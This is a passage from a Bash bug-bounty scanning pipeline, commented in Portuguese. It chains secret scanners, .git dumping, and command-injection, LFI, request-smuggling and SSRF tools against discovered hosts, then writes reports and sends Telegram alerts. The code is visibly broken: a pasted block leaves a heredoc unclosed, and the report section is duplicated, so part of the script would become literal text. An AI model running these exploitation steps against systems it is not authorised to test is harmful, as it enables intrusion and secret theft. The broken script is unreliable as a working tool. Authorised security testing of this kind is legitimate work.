        done
        
        cat reports/secretfinder/secrets_*.txt 2>/dev/null | grep -Ei "API|KEY|TOKEN|SECRET|PASSWORD" | sort -u > reports/secretfinder/all_secrets.txt || true
        log_info "✅ secretfinder completo"
    fi
}

# ============= TRUFFLEHOG - Git Secrets Scanner =============
run_trufflehog() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando trufflehog"
        return 0
    fi
    
    if command -v trufflehog >/dev/null 2>&1; then
        log_info "▶️  Executando trufflehog em hosts..."
        mkdir -p reports/trufflehog
        
        head -5 alive/hosts_only.txt | while read -r domain; do
            safe_name=$(echo "$domain" | sed 's/[^a-zA-Z0-9._-]/_/g')
            # Tentar escanear repositório se disponível
            timeout 300s trufflehog https://github.com/${domain} --json > reports/trufflehog/secrets_${safe_name}.json 2>/dev/null || true
        done
        
        log_info "✅ trufflehog completo"
    fi
}

# ============= GITLEAKS - Git Secrets Scanner =============
run_gitleaks() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo para escanear - pulando gitleaks"
        return 0
    fi
    
    if command -v gitleaks >/dev/null 2>&1; then
        log_info "▶️  Executando gitleaks..."
        mkdir -p reports/gitleaks
        
        timeout 300s gitleaks detect --source js/downloads --report-path reports/gitleaks/report.json --no-git 2>/dev/null || true
        log_info "✅ gitleaks completo"
    fi
}

# ============= GIT-DUMPER - Dump Exposed .git =============
run_git_dumper() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando git-dumper"
        return 0
    fi
    
    if command -v git-dumper >/dev/null 2>&1; then
        log_info "▶️  Executando git-dumper..."
        mkdir -p reports/git_dumper
        
        head -5 alive/hosts.txt | while read -r url; do
            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')
            git_url="${url}/.git/"
            
            # Verificar se .git está exposto
            if curl -s -m 10 "${git_url}HEAD" | grep -q "ref:"; then
                log_info "🔥 .git exposto encontrado em: $url"
                timeout 300s git-dumper "$git_url" "reports/git_dumper/${safe_name}" 2>/dev/null || true
            fi
        done
        
        log_info "✅ git-dumper completo"
    fi
}

# ============= COMMIX - Command Injection =============
run_commix() {
    if [[ ! -s urls/with_params.txt ]]; then
        log_info "⚠️  Nenhuma URL parametrizada - pulando commix"
        return 0
    fi
    
    if command -v commix >/dev/null 2>&1; then
        log_info "▶️  Executando commix para command injection..."
        mkdir -p reports/commix
        
        head -5 urls/with_params.txt | while read -r url; do
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            timeout 180s commix --url="$url" --batch --output-dir="reports/commix" > reports/commix/commix_${safe_name}.txt 2>&1 || true
        done
        
        log_info "✅ commix completo"
    fi
}

# ============= LFISUITE - LFI Scanner =============
run_lfisuite() {
    if [[ ! -s urls/gf_lfi.txt ]]; then
        log_info "⚠️  Nenhum candidato LFI - pulando lfisuite"
        return 0
    fi
    
    if command -v lfisuite >/dev/null 2>&1; then
        log_info "▶️  Executando lfisuite..."
        mkdir -p reports/lfisuite
        
        head -10 urls/gf_lfi.txt | while read -r url; do
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            timeout 120s lfisuite -u "$url" -o reports/lfisuite/lfi_${safe_name}.txt 2>/dev/null || true
        done
        
        log_info "✅ lfisuite completo"
    fi
}

# ============= SMUGGLER - HTTP Request Smuggling =============
run_smuggler() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando smuggler"
        return 0
    fi
    
    if command -v smuggler >/dev/null 2>&1; then
        log_info "▶️  Executando smuggler para HTTP request smuggling..."
        mkdir -p reports/smuggler
        
        timeout 600s smuggler -u alive/hosts.txt -o reports/smuggler/smuggling_results.txt 2>/dev/null || true
        log_info "✅ smuggler completo"
    fi
}

# ============= SSRFMAP - SSRF Testing =============
run_ssrfmap() {
    if [[ ! -s urls/gf_ssrf.txt ]]; then
        log_info "⚠️  Nenhum candidato SSRF - pulando ssrfmap"
        return 0
    fi
    
    if command -v ssrfmap >/dev/null 2>&1; then
        log_info "▶️  Executando ssrfmap..."
        mkdir -p reports/ssrfmap
        
        head -10 urls/gf_ssrf.txt | while read -r url; do
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            timeout 180s ssrfmap -r "$url" -p payloads --output reports/ssrfmap/ssrf_${safe_name}.txt 2>/dev/null || true
        done
        
        log_info "✅ ssrfmap completo"
    fi
}

# ============= HTTPROBE - Additional HTTP Probing =============
run_httprobe() {
    if [[ ! -s subs/all_subs.txt ]]; then
        log_info "⚠️  Nenhum subdomínio - pulando httprobe"
        return 0
    fi
    
    if command -v httprobe >/dev/null 2>&1; then
        log_info "▶️  Executando httprobe..."
        mkdir -p reports/httprobe
        
        cat subs/all_subs.txt | timeout 600s httprobe -c "$CONCURRENCY" | tee reports/httprobe/live_hosts.txt
        log_info "✅ httprobe completo"
    fi
}

# ============= GOWITNESS - Screenshot Tool =============
run_gowitness() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando gowitness"
        return 0
    fi
    
    if command -v gowitness >/dev/null 2>&1; then
        log_info "▶️  Executando gowitness para screenshots..."
        mkdir -p screenshots/gowitness
        
        timeout 900s gowitness file -f alive/hosts.txt --destination screenshots/gowitness --threads "$PARALLEL_HOSTS" 2>/dev/null || true
        log_info "✅ gowitness completo - screenshots em screenshots/gowitness/"
    fi
}

# ============= AQUATONE - Visual Inspection =============
run_aquatone() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando aquatone"
        return 0
    fi
    
    if command -v aquatone >/dev/null 2>&1; then
        log_info "▶️  Executando aquatone para screenshots..."
        mkdir -p screenshots/aquatone
        
        cat alive/hosts.txt | timeout 900s aquatone -out screenshots/aquatone -threads "$PARALLEL_HOSTS" 2>/dev/null || true
        log_info "✅ aquatone completo - relatório HTML em screenshots/aquatone/"
    fi
}

# ============= S3SCANNER - AWS S3 Bucket Scanner =============
run_s3scanner() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando s3scanner"
        return 0
    fi
    
    if command -v s3scanner >/dev/null 2>&1; then
        log_info "▶️  Executando s3scanner..."
        mkdir -p reports/s3scanner
        
        # Gerar possíveis nomes de buckets a partir dos domínios
        cat alive/hosts_only.txt | sed 's/\./-/g' | head -50 > reports/s3scanner/bucket_names.txt
        
        timeout 600s s3scanner scan -f reports/s3scanner/bucket_names.txt -o reports/s3scanner/buckets_found.txt 2>/dev/null || true
        log_info "✅ s3scanner completo"
    fi
}

# ============= CLOUD_ENUM - Cloud Asset Discovery =============
run_cloud_enum() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando cloud_enum"
        return 0
    fi
    
    if command -v cloud_enum >/dev/null 2>&1; then
        log_info "▶️  Executando cloud_enum..."
        mkdir -p reports/cloud_enum
        
        # Extrair keywords dos domínios
        head -10 alive/hosts_only.txt | sed 's/\.com.*//;s/\..*$//' | sort -u > reports/cloud_enum/keywords.txt
        
        timeout 600s cloud_enum -k reports/cloud_enum/keywords.txt -l reports/cloud_enum/results.txt 2>/dev/null || true
        log_info "✅ cloud_enum completo"
    fi
}

# ============= EXECUÇÃO PARALELA CONTROLADA DAS EXTRA TOOLS =============
run_extra_tools() {
    log_info "🚀 Iniciando execução paralela das EXTRA TOOLS..."
    
    # Executar ferramentas em grupos paralelos baseado no perfil
    local max_parallel=3
    [[ "$PROFILE" = "light" ]] && max_parallel=2
    [[ "$PROFILE" = "aggressive" ]] && max_parallel=5
    
    # Grupo 1: XSS Tools (paralelo)
    (run_kxss) &
    (run_gxss) &
    wait
    
    # Grupo 2: Link/Endpoint Discovery (paralelo)
    (run_linkfinder) &
    (run_xnlinkfinder) &
    (run_paramspider) &
    wait
    
    # Grupo 3: Parameter Bruteforce (sequencial - mais pesado)
    run_arjun
    
    # Grupo 4: Secret Scanners (paralelo)
    (run_secretfinder) &
    (run_trufflehog) &
    (run_gitleaks) &
    wait
    
    # Grupo 5: Exploitation Tools (sequencial - invasivo)
    run_git_dumper
    run_commix
    run_lfisuite
    
    # Grupo 6: Advanced Testing (paralelo)
    (run_smuggler) &
    (run_ssrfmap) &
    wait
    
    # Grupo 7: Probing & Screenshots (paralelo)
    (run_httprobe) &
    (run_gowitness) &
    (run_aquatone) &
    wait
    
    # Grupo 8: Cloud Enumeration (paralelo)
    (run_s3scanner) &
    (run_cloud_enum) &
    wait
    
    log_info "✅ Todas as EXTRA TOOLS foram executadas"
}

# Executar EXTRA TOOLS apenas em modo ativo
if [[ "$DRY_RUN" = "false" ]]; then
    run_extra_tools
else
    log_info "DRY-RUN: Pulando EXTRA TOOLS"
fi

# ============= CONTAGEM DE RESULTADOS DAS EXTRA TOOLS =============
KXSS_RESULTS=$(safe_count reports/kxss/kxss_results.txt)
GXSS_RESULTS=$(safe_count reports/gxss/gxss_results.txt)
LINKFINDER_ENDPOINTS=$(safe_count reports/linkfinder/all_endpoints.txt)
XNLINKFINDER_LINKS=$(safe_count reports/xnlinkfinder/all_links.txt)
PARAMSPIDER_PARAMS=$(safe_count reports/paramspider/all_params.txt)
SECRETFINDER_SECRETS=$(safe_count reports/secretfinder/all_secrets.txt)
GOWITNESS_SCREENSHOTS=$(find screenshots/gowitness -name "*.png" 2>/dev/null | wc -l)
AQUATONE_SCREENSHOTS=$(find screenshots/aquatone -name "*.png" 2>/dev/null | wc -l)
S3_BUCKETS=$(safe_count reports/s3scanner/buckets_found.txt)

send_telegram_status "✅ *FASE 6 COMPLETA - EXTRA TOOLS*
🎯 kxss: $KXSS_RESULTS resultados
🎯 gxss: $GXSS_RESULTS resultados  
🔗 linkfinder: $LINKFINDER_ENDPOINTS endpoints
🔗 xnLinkFinder: $XNLINKFINDER_LINKS links
📊 paramspider: $PARAMSPIDER_PARAMS parâmetros
🔑 secretfinder: $SECRETFINDER_SECRETS secrets
📸 gowitness: $GOWITNESS_SCREENSHOTS screenshots
📸 aquatone: $AQUATONE_SCREENSHOTS screenshots
☁️ S3 buckets: $S3_BUCKETS encontrados"

# Contar vulnerabilidades para resumo
NUCLEI_FAST_COUNT=$(safe_count nuclei/nuclei_hosts_fast.txt)
NUCLEI_FAST_URLS=$(safe_count nuclei/nuclei_urls_fast.txt)
NUCLEI_EXT_COUNT=$(safe_count nuclei/nuclei_hosts_ext.txt)
NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT))
DALFOX_RESULTS=$(safe_count nuclei/dalfox_results.txt)
SQLI_VALIDATED=$(safe_count urls/sqli_validated.txt)

# ADICIONE ESTAS LINHAS AQUI:
TOTAL_SECRETS=$(($(safe_count secrets/aws_keys.txt) + $(safe_count secrets/google_api_keys.txt) + $(safe_count secrets/jwt_tokens.txt) + $(safe_count secrets/github_tokens.txt) + $(safe_count secrets/stripe_keys.txt) + SECRETFINDER_SECRETS))

# Certifique-se que o diretório html existe
mkdir -p html

# Criar resumo de vulnerabilidades
cat > reports/vuln_summary.txt <<-VSUMMARY



# ============= RELATÓRIOS APRIMORADOS =============
echo ""
echo "========== GENERATING ENHANCED REPORTS =========="
send_telegram_status "📊 *GENERATING REPORTS*
Compilando relatórios finais..."

# Contar vulnerabilidades para resumo
NUCLEI_FAST_COUNT=$(safe_count nuclei/nuclei_hosts_fast.txt)
NUCLEI_FAST_URLS=$(safe_count nuclei/nuclei_urls_fast.txt)
NUCLEI_EXT_COUNT=$(safe_count nuclei/nuclei_hosts_ext.txt)
NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT))
DALFOX_RESULTS=$(safe_count nuclei/dalfox_results.txt)
SQLI_VALIDATED=$(safe_count urls/sqli_validated.txt)

# Criar resumo de vulnerabilidades
cat > reports/vuln_summary.txt <<-VSUMMARY
VULNERABILITY SUMMARY - $(date -u)
=====================================

🔥 CRITICAL FINDINGS:
- Nuclei Critical: $NUCLEI_FAST_TOTAL  
- SQLi Confirmed: $SQLI_VALIDATED
- Exposed Secrets: $TOTAL_SECRETS (includes secretfinder: $SECRETFINDER_SECRETS)
- XSS Findings: $DALFOX_RESULTS

⚡ POTENTIAL ISSUES:
- XSS Candidates: $XSS_CANDIDATES (kxss: $KXSS_RESULTS, gxss: $GXSS_RESULTS)
- SQLi Candidates: $SQLI_CANDIDATES
- LFI Candidates: $LFI_CANDIDATES
- SSRF Candidates: $SSRF_CANDIDATES
- Nuclei Medium: $NUCLEI_EXT_TOTAL

📊 ATTACK SURFACE:
- Live Hosts: $LIVE_HOSTS
- URLs with Params: $PARAM_URLS
- API Endpoints: $API_ENDPOINTS
- JS Files Downloaded: $JS_DOWNLOADED
- New Endpoints (linkfinder): $LINKFINDER_ENDPOINTS
- New Params (paramspider): $PARAMSPIDER_PARAMS

🔧 EXTRA TOOLS RESULTS:
- Screenshots (gowitness): $GOWITNESS_SCREENSHOTS
- Screenshots (aquatone): $AQUATONE_SCREENSHOTS
- S3 Buckets Found: $S3_BUCKETS
- Links Discovered (xnLinkFinder): $XNLINKFINDER_LINKS

PROFILE: $PROFILE
MODE: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (collection only)" || echo "ACTIVE (full scanning)")
PRIORITY: $([ "$NUCLEI_FAST_TOTAL" -gt 5 ] && echo "🔴 HIGH" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "🟡 MEDIUM" || echo "🟢 LOW")
VSUMMARY

# Relatório markdown completo
REPORT=reports/report.md

cat > "$REPORT" <<-EOT
# Bug Bounty Reconnaissance Report
Generated: $(date -u)  
Target Scope: $(basename "$SCOPE_FILE")
Profile: **$PROFILE** | Mode: **$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")**

## 🎯 Executive Summary
- **Attack Surface**: $LIVE_HOSTS live hosts, $PARAM_URLS parameterized URLs
- **Risk Level**: $([ "$NUCLEI_FAST_TOTAL" -gt 5 ] && echo "🔴 **HIGH**" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "🟡 **MEDIUM**" || echo "🟢 **LOW**")
- **Scan Profile**: $PROFILE (Concurrency: $CONCURRENCY, Rate: $RATE_LIMIT/s)

## 🔥 Critical Vulnerabilities Confirmed

### High-Risk Nuclei Findings
- **Fast Scan**: $NUCLEI_FAST_TOTAL critical findings
- **Details**: See \`nuclei/nuclei_hosts_fast.txt\` and \`nuclei/nuclei_urls_fast.txt\`

### Cross-Site Scripting (XSS)
- **Dalfox Results**: $DALFOX_RESULTS confirmed findings
- **Candidates**: $XSS_CANDIDATES endpoints
- **Details**: See \`nuclei/dalfox_results.txt\` and \`urls/gf_xss.txt\`

### Information Disclosure  
- **Secrets Found**: $TOTAL_SECRETS items
- **AWS Keys**: $(safe_count secrets/aws_keys.txt)
- **Google API**: $(safe_count secrets/google_api_keys.txt)
- **JWT Tokens**: $(safe_count secrets/jwt_tokens.txt)
- **GitHub Tokens**: $(safe_count secrets/github_tokens.txt)
- **Stripe Keys**: $(safe_count secrets/stripe_keys.txt)
- **Location**: \`secrets/\` directory

## ⚡ Potential Vulnerabilities

### SQL Injection
- **Candidates**: $SQLI_CANDIDATES endpoints  
- **Confirmed**: $(safe_count urls/sqli_validated.txt) vulnerabilities
- **Details**: See \`urls/gf_sqli.txt\` and \`poc/sqli/\`
- **Note**: SQLMap testing enabled with safety controls

### Other Vulnerabilities
- **LFI Candidates**: $LFI_CANDIDATES
- **SSRF Candidates**: $SSRF_CANDIDATES
- **RCE Candidates**: $(safe_count urls/gf_rce.txt)

### Misconfigurations
- **Nuclei Extended**: $NUCLEI_EXT_TOTAL findings  
- **Details**: See \`nuclei/nuclei_hosts_ext.txt\`

## 📊 Attack Surface Analysis

### Reconnaissance Results
- **Subdomains Discovered**: $SUBS_FOUND
- **Live Hosts**: $LIVE_HOSTS  
- **Total URLs**: $TOTAL_URLS
- **Parameterized URLs**: $PARAM_URLS
- **JavaScript Files**: $JS_FILES ($JS_DOWNLOADED downloaded)

### API Surface  
- **API Endpoints**: $API_ENDPOINTS
- **Details**: See \`apis/api_endpoints.txt\`

### Port Scanning
- **Open Ports**: $PORTS_FOUND
- **Hosts with Ports**: $HOSTS_WITH_PORTS

### Technology Stack
- **Details**: See \`alive/httpx_parsed.txt\` for full tech stack information

## 🔧 EXTRA TOOLS Results

### XSS Detection
- **kxss Results**: $KXSS_RESULTS findings
- **gxss Results**: $GXSS_RESULTS findings
- **Reports**: \`reports/kxss/\` and \`reports/gxss/\`

### Endpoint & Link Discovery
- **linkfinder**: $LINKFINDER_ENDPOINTS endpoints extracted from JS
- **xnLinkFinder**: $XNLINKFINDER_LINKS links discovered
- **paramspider**: $PARAMSPIDER_PARAMS parameters found
- **Reports**: \`reports/linkfinder/\`, \`reports/xnlinkfinder/\`, \`reports/paramspider/\`

### Secret Scanning
- **secretfinder**: $SECRETFINDER_SECRETS secrets in JS files
- **gitleaks**: Check \`reports/gitleaks/report.json\`
- **trufflehog**: Check \`reports/trufflehog/\`
- **git-dumper**: Check \`reports/git_dumper/\` for exposed .git

### Visual Reconnaissance
- **gowitness**: $GOWITNESS_SCREENSHOTS screenshots captured
- **aquatone**: $AQUATONE_SCREENSHOTS screenshots + HTML report
- **Location**: \`screenshots/gowitness/\` and \`screenshots/aquatone/\`

### Cloud Assets
- **s3scanner**: $S3_BUCKETS S3 buckets found
- **cloud_enum**: Check \`reports/cloud_enum/results.txt\`

### Advanced Testing
- **commix**: Command injection testing in \`reports/commix/\`
- **lfisuite**: LFI testing in \`reports/lfisuite/\`
- **smuggler**: HTTP smuggling in \`reports/smuggler/\`
- **ssrfmap**: SSRF testing in \`reports/ssrfmap/\`

## 📁 Important Files
- **Live Hosts**: \`alive/httpx_results.txt\`
- **Parameterized URLs**: \`urls/with_params.txt\` 
- **Nuclei Results**: \`nuclei/nuclei_*_fast.txt\` (critical), \`nuclei/nuclei_*_ext.txt\` (extended)
- **XSS Results**: \`nuclei/dalfox_results.txt\`
- **Secrets**: \`secrets/\` directory
- **API Endpoints**: \`apis/api_endpoints.txt\`
- **GF Classification**: \`urls/gf_*.txt\`

## 🚀 Next Steps
1. **Immediate**: Review critical Nuclei findings in \`nuclei/nuclei_*_fast.txt\`
2. **High Priority**: Validate XSS findings from Dalfox
3. **Medium Priority**: Review secrets in \`secrets/\` for sensitive exposure
4. **Validated SQLi**: Check confirmed SQLi in \`urls/sqli_validated.txt\` and \`poc/sqli/\`
5. **Manual Testing**: Additional SQLi candidates in \`urls/gf_sqli.txt\`
6. **Ongoing**: Monitor misconfigurations from extended Nuclei scan

## ⚙️ Configuration Used
- **Profile**: $PROFILE
- **Concurrency**: $CONCURRENCY threads
- **Rate Limit**: $RATE_LIMIT/s
- **Parallel Hosts**: $PARALLEL_HOSTS
- **Timeout**: $TIMEOUT_PER_HOST per host
- **Mode**: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (safe collection only)" || echo "ACTIVE (full vulnerability scanning)")

## ⚠️ Methodology Notes
- Profile-based resource management for safe operation
- DRY-RUN mode enabled by default for safety
- Active scanning requires explicit --confirm flag
- SQLMap testing enabled with level=1, risk=1 safety controls
- All timeouts and rate limits configured per profile
- Scope validation and wildcard handling implemented
- Manual verification required before reporting findings

## 🔧 Tool Coverage
**Subdomain Enumeration**: subfinder, amass, findomain, chaos, crt.sh
**Live Detection**: httpx with tech detection, httprobe
**Port Scanning**: naabu$([ "$DRY_RUN" = "true" ] && echo " (skipped in dry-run)" || echo "")
**URL Collection**: gau, waybackurls, hakrawler, katana, gospider
**Vulnerability Scanning**: nuclei, dalfox$([ "$DRY_RUN" = "true" ] && echo " (skipped in dry-run)" || echo "")
**Classification**: gf patterns
**Secrets**: regex-based JS analysis, secretfinder, trufflehog, gitleaks
**XSS Detection**: kxss, gxss
**Endpoint Discovery**: linkfinder, xnLinkFinder, paramspider, arjun
**Exploitation**: commix, lfisuite, smuggler, ssrfmap
**Visual Recon**: gowitness, aquatone
**Cloud Assets**: s3scanner, cloud_enum
**Git Exposure**: git-dumper

---
**Report generated by enhanced reconnaissance pipeline with profile-based controls**
**Command used**: $0 $([ "$DRY_RUN" = "true" ] && echo "--dry-run" || echo "--confirm") --profile=$PROFILE $SCOPE_FILE
EOT

# Criar dashboard HTML melhorado
HTML=html/dashboard.html
mkdir -p "$(dirname "$HTML")"
cat > "$HTML" <<-HTMLDOC

<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Enhanced Recon Dashboard</title>
  <style>
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;padding:20px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);margin:0}
    .container{max-width:1400px;margin:0 auto;background:white;padding:30px;border-radius:15px;box-shadow:0 8px 32px rgba(0,0,0,0.1)}
    .header{text-align:center;margin-bottom:30px;padding:20px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);border-radius:10px;color:white}
    .metric{display:inline-block;margin:10px;padding:20px;background:#f8f9fa;border-radius:12px;min-width:140px;text-align:center;border:2px solid transparent;transition:all 0.3s ease}
    .metric:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,0,0,0.1)}
    .metric-value{font-size:28px;font-weight:bold;color:#2563eb}
    .metric-label{font-size:12px;color:#6b7280;margin-top:8px;font-weight:500}
    .critical{background:linear-gradient(135deg,#fef2f2,#fee2e2);border-color:#ef4444;color:#dc2626}
    .critical .metric-value{color:#dc2626}
    .warning{background:linear-gradient(135deg,#fefce8,#fef3c7);border-color:#f59e0b;color:#d97706}
    .warning .metric-value{color:#d97706}
    .success{background:linear-gradient(135deg,#f0fdf4,#dcfce7);border-color:#10b981;color:#059669}
    .success .metric-value{color:#059669}
    .profile-badge{display:inline-block;padding:8px 16px;background:#6366f1;color:white;border-radius:20px;font-size:14px;font-weight:bold;margin:10px}
    pre{background:#f4f4f4;padding:15px;border-radius:8px;overflow-x:auto;border-left:4px solid #6366f1}
    h1{color:#1f2937;margin-bottom:10px;font-size:2.5rem}
    h2{color:#374151;margin-top:40px;margin-bottom:20px;font-size:1.5rem;border-bottom:2px solid #e5e7eb;padding-bottom:10px}
    .status{text-align:center;padding:15px;border-radius:10px;margin:20px 0;font-weight:bold}
    .dry-run{background:#fef3c7;color:#92400e;border:2px solid #f59e0b}
    .active{background:#dcfce7;color:#166534;border:2px solid #10b981}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin:20px 0}
    .card{background:white;padding:20px;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,0.1);border-left:4px solid #6366f1}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🎯 Enhanced Bug Bounty Dashboard</h1>
      <p><strong>Generated:</strong> $(date -u) | <strong>Target:</strong> $(basename "$SCOPE_FILE")</p>
      <span class="profile-badge">Profile: $PROFILE</span>
    </div>
    
    <div class="status $([ "$DRY_RUN" = "true" ] && echo "dry-run" || echo "active")">
      Mode: $([ "$DRY_RUN" = "true" ] && echo "🔍 DRY-RUN (Collection Only)" || echo "⚡ ACTIVE SCANNING")
    </div>
    
    <h2>📊 Attack Surface Overview</h2>
    <div class="metric">
      <div class="metric-value">$SUBS_FOUND</div>
      <div class="metric-label">Subdomains</div>
    </div>
    <div class="metric success">
      <div class="metric-value">$LIVE_HOSTS</div>
      <div class="metric-label">Live Hosts</div>
    </div>
    <div class="metric">
      <div class="metric-value">$TOTAL_URLS</div>
      <div class="metric-label">URLs Found</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$PARAM_URLS</div>
      <div class="metric-label">With Parameters</div>
    </div>
    <div class="metric">
      <div class="metric-value">$API_ENDPOINTS</div>
      <div class="metric-label">API Endpoints</div>
    </div>
    
    <h2>🔥 Critical Security Findings</h2>
    <div class="metric critical">
      <div class="metric-value">$NUCLEI_FAST_TOTAL</div>
      <div class="metric-label">Nuclei Critical</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$SQLI_VALIDATED</div>
      <div class="metric-label">SQLi Confirmed</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$DALFOX_RESULTS</div>
      <div class="metric-label">XSS Confirmed</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$TOTAL_SECRETS</div>
      <div class="metric-label">Secrets Exposed</div>
    </div>
    
    <h2>⚡ Vulnerability Candidates</h2>
    <div class="metric warning">
      <div class="metric-value">$XSS_CANDIDATES</div>
      <div class="metric-label">XSS Candidates</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$SQLI_CANDIDATES</div>
      <div class="metric-label">SQLi Candidates</div>
    </div>
    <div class="metric">
      <div class="metric-value">$LFI_CANDIDATES</div>
      <div class="metric-label">LFI Candidates</div>
    </div>
    <div class="metric">
      <div class="metric-value">$SSRF_CANDIDATES</div>
      <div class="metric-label">SSRF Candidates</div>
    </div>
    
    <div class="grid">
      <div class="card">
        <h3>🔧 Profile Configuration</h3>
        <ul>
          <li>Concurrency: $CONCURRENCY threads</li>
          <li>Rate Limit: $RATE_LIMIT/s</li>
          <li>Parallel Hosts: $PARALLEL_HOSTS</li>
          <li>Timeout: $TIMEOUT_PER_HOST</li>
          <li>CPUs: $NCPU</li>
        </ul>
      </div>
      
      <div class="card">
        <h3>📈 Success Rates</h3>
        <ul>
          <li>Subdomain Expansion: $(echo "scale=1; $SUBS_FOUND / $TOTAL_DOMAINS" | bc 2>/dev/null || echo "N/A")x</li>
          <li>Live Host Rate: $(echo "scale=1; $LIVE_HOSTS * 100 / $SUBS_FOUND" | bc 2>/dev/null || echo "N/A")%</li>
          <li>Parameterized URLs: $(echo "scale=1; $PARAM_URLS * 100 / $TOTAL_URLS" | bc 2>/dev/null || echo "N/A")%</li>
        </ul>
      </div>
    </div>
    
    <h2>🔍 Latest Critical Findings</h2>
    <pre>$(head -n 20 nuclei/nuclei_*_fast.txt nuclei/dalfox_results.txt 2>/dev/null || echo "No critical findings in this scan")</pre>
    
    <h2>🔗 Quick Navigation</h2>
    <div class="grid">
      <div class="card">
        <h3>📋 Reports</h3>
        <ul>
          <li><a href="../reports/report.md">📋 Full Report</a></li>
          <li><a href="../reports/vuln_summary.txt">⚡ Quick Summary</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>🔥 Vulnerabilities</h3>
        <ul>
          <li><a href="../nuclei/">🎯 Nuclei Results</a></li>
          <li><a href="../secrets/">🔑 Secrets Directory</a></li>
          <li><a href="../urls/sqli_validated.txt">💉 SQLi Confirmed</a></li>
          <li><a href="../urls/gf_xss.txt">❌ XSS Candidates</a></li>
          <li><a href="../urls/gf_sqli.txt">💉 SQLi Candidates</a></li>
          <li><a href="../poc/sqli/">📁 SQLi PoCs</a></li>
        </ul>
      </div>
      
      <div class="card">
        <h3>📊 Data Files</h3>
        <ul>
          <li><a href="../alive/hosts.txt">✅ Live Hosts</a></li>
          <li><a href="../urls/with_params.txt">🎯 Parameterized URLs</a></li>
          <li><a href="../apis/api_endpoints.txt">🔌 API Endpoints</a></li>
          <li><a href="../js/downloads/">📜 JS Files</a></li>
        </ul>
      </div>
    </div>
    
    <div style="text-align:center;margin-top:40px;padding:20px;background:#f8f9fa;border-radius:10px">
      <p><strong>Enhanced Bug Bounty Scanner v2.0</strong></p>
      <p>Profile-based • Safety-first • Comprehensive coverage</p>
    </div>
  </div>
</body>
</html>
HTMLDOC

# ============= EXPORT JSON (OPCIONAL) =============
if [[ "$EXPORT_JSON" = "true" ]]; then
    log_info "Exportando resultados em JSON..."
    
    cat > reports/results.json <<-JSONEOF
{
  "scan_info": {
    "timestamp": "$(date -u -Iseconds)",
    "target_scope": "$(basename "$SCOPE_FILE")",
    "profile": "$PROFILE", 
    "mode": "$([ "$DRY_RUN" = "true" ] && echo "dry-run" || echo "active")",
    "configuration": {
      "concurrency": $CONCURRENCY,
      "rate_limit": $RATE_LIMIT,
      "parallel_hosts": $PARALLEL_HOSTS,
      "timeout_per_host": "$TIMEOUT_PER_HOST"
    }
  },
  "statistics": {
    "total_domains": $TOTAL_DOMAINS,
    "subdomains_found": $SUBS_FOUND,
    "live_hosts": $LIVE_HOSTS,
    "total_urls": $TOTAL_URLS,
    "parameterized_urls": $PARAM_URLS,
    "js_files": $JS_FILES,
    "api_endpoints": $API_ENDPOINTS,
    "ports_found": $PORTS_FOUND
  },
  "vulnerabilities": {
    "nuclei_critical": $NUCLEI_FAST_TOTAL,
    "nuclei_medium": $NUCLEI_EXT_TOTAL,
    "xss_confirmed": $DALFOX_RESULTS,
    "secrets_exposed": $TOTAL_SECRETS,
    "candidates": {
      "xss": $XSS_CANDIDATES,
      "sqli": $SQLI_CANDIDATES,
      "lfi": $LFI_CANDIDATES,
      "ssrf": $SSRF_CANDIDATES
    }
  },
  "files": {
    "live_hosts": "alive/hosts.txt",
    "parameterized_urls": "urls/with_params.txt",
    "nuclei_results": "nuclei/",
    "secrets": "secrets/",
    "reports": "reports/"
  }
}
JSONEOF
fi

# ============= TELEGRAM FINAL REPORT =============
final_telegram_report() {
    if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
        log_info "Enviando relatório final para Telegram..."
        
        # Determinar nível de alerta
        if [[ "$NUCLEI_FAST_TOTAL" -gt 5 ]] || [[ "$DALFOX_RESULTS" -gt 0 ]] || [[ "$SQLI_VALIDATED" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 10 ]]; then
            ALERT="🔴 *HIGH RISK*"
